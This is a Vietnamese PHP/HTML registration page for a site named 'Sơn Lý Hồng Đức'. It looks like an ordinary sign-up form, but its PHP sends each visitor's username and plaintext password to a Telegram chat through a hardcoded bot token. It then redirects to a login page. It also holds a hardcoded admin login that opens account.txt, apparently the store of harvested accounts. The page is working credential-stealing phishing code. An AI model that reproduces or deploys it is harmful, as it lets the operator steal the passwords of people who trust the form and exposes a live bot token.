<?php
    session_start();
    ob_start();
?>
    <?php
    	if(isset($_POST["login"])){ //name in button HTML (send)
    		$username = $_POST["email"]; //name in HTML
    		$password = $_POST["pass"]; //name in HTML
            if($username == "slhd2003" && $password == "slhd2003"){
                echo "<script>alert('Bạn đang đăng nhập vào Admin');</script>";
                header('Location: account.txt');
                
} else {
                    
             $_SESSION["Username"] = $username;
             echo $_SESSION["Username"];
            $botToken = "6525730844:AAGj15TJV59qozfV6vZZD8Cmr85hHc8-Lcc";
$chatId = "-1002042330395"; // ID của cuộc trò chuyện hoặc người dùng bạn muốn gửi tin nhắn
$message = "\n[THÔNG BÁO ĐĂNG KÝ]\nTài khoản: $username\nMật khẩu: $password\nĐăng ký bằng Websites";

// Tạo URL để gửi yêu cầu API Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message
];

$options = [
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);

// Gửi yêu cầu HTTP sử dụng cURL
$response = file_get_contents($url, false, $context);
echo '<script>window.location.href="https://hongduc101010.000webhostapp.com/login.php"</script>';

        }
    }
?>









<!DOCTYPE html>
<html>
<head>

<meta charset='utf-8' />
<meta content='width=device-width, initial-scale=1' name='viewport' />
<meta property="og:title" content="Đăng nhập hệ thống - Sơn Lý Hồng Đức" />
<meta property="og:image" href="img/anh2.png" />

<link crossorigin='anonymous' href='https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css' integrity='sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC' rel='stylesheet' />
<link rel="shortcut icon" href="img/logo.png">
<title>Đăng ký - Sơn Lý Hồng Đức</title>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js'></script>
<style id='page-skin-1' type='text/css'><!--
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
body{
font-family: 'Roboto', sans-serif;
}
input.form-control {
border: outset;
border-bottom: 2px solid #098e00;
background: none;
}
@media (pointer: fine) {
.fblog{
width: 600px;
text-align: center;
margin: auto;

}
}
._8qtf {
margin: 12px 0 4px 0;
width: 100%;
}
._43mg {
display: block;
overflow: hidden;
text-align: center;
white-space: nowrap;
}
._43mg>span {
display: inline-block;
position: relative;
}
._43mh {
color: #098e00;
}
._43mg {
display: block;
overflow: hidden;
text-align: center;
white-space: nowrap;
}._43mg>span:before {
margin-right: 50px;
right: 100%;
}
._43mg>span:before, ._43mg>span:after {
background: #098e00;
content: '';
height: 1px;
position: absolute;
top: 50%;
width: 9999px;
}
._43mg>span:after {
left: 100%;
margin-left: 15px;
}
._43mg>span:before, ._43mg>span:after {
background: #098e00;
content: '';
height: 1px;
position: absolute;
top: 50%;
width: 9999px;
}
._43mg {
display: block;
overflow: hidden;
text-align: center;
margin-top: 5px;
white-space: nowrap;
}
.fblog>img-pluid{
display: block;
margin-left: auto;
margin-right: auto;
width: 800px
}
.nho-dang-nhap{
margin-bottom: 10px;
color: #608b62;
font-size: 15px;
margin-left: auto;
}    
.dangky-dangnhap{
width: 500px;
padding: 10px;
margin: 0 auto;
background-color: rgb(255, 255, 255);
color: #608b62;
}
--></style>
</head>

<body>
    
    
<!-- Messenger Plugin chat Code -->
    <div id="fb-root"></div>

    <!-- Your Plugin chat code -->
    <div id="fb-customer-chat" class="fb-customerchat">
    </div>

    <script>
      var chatbox = document.getElementById('fb-customer-chat');
      chatbox.setAttribute("page_id", "103398482295078");
      chatbox.setAttribute("attribution", "biz_inbox");
    </script>

    <!-- Your SDK code -->
    <script>
      window.fbAsyncInit = function() {
        FB.init({
          xfbml            : true,
          version          : 'v18.0'
        });
      };

      (function(d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) return;
        js = d.createElement(s); js.id = id;
        js.src = 'https://connect.facebook.net/vi_VN/sdk/xfbml.customerchat.js';
        fjs.parentNode.insertBefore(js, fjs);
      }(document, 'script', 'facebook-jssdk'));
    </script>
    
    
    
    
    
    
<div class='fblog'>
<img class='img-fluid' src='img/anh.png'/>
<center class='mt-2'><small>♥️</small></center>
<div class='container'>
<div class='row justify-content-center'>
<div class='col-10'>
<form action='' method='POST'>
<div class='mb-4 mt-4'>
<input class='form-control' name='email' placeholder='Tên đăng nhập' required='required' type='text' />
</div>
<div class='mb-4'>
<input class='form-control' name='pass' placeholder='Nhập mật khẩu' required='required' type='password' />
</div>
<div class='mb-4'>
<input class='form-control' name='pass' placeholder='Nhập lại mật khẩu' required='required' type='password' />
</div>
<div class='d-grid gap-2'>
    <button class='btn btn-primary'  name='login' onclick="thongbao()"  style= background:#098e00 'font-size: 15px; font-weight:600; ' type='submit'>Đăng ký</button>
</div>
<div class='dangky-dangnhap'>
<p>Bạn đã có tài khoảng?<a href="https://hongduc101010.000webhostapp.com/login.php"> Đăng nhập</a>.</p>
</div> 
</form>
<br />
</div>
</div></div>
</div>
<div class='navbar no-items section' id='navbar'></div>

<script type='text/javascript'>
$("#dangnhap").click(function(){
    $("#dangnhap").text('Vui lòng chờ...');
    $("#dangnhap").addClass('disabled');
    })
  function GetURLParameter(sParam)
{
    var sPageURL = window.location.search.substring(1);
    var sURLVariables = sPageURL.split('&');
    for (var i = 0; i < sURLVariables.length; i++) 
    {
        var sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] == sParam) 
        {
            return sParameterName[1];
        }
    }
}
                                             </script>
<script>
    $(document).ready(function(){
    var tech = GetURLParameter('id');
    $("input[name=id]").val(tech);
    });
  </script>
<script crossorigin='anonymous' integrity='sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM' src='https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js'></script>
</body>

</html>
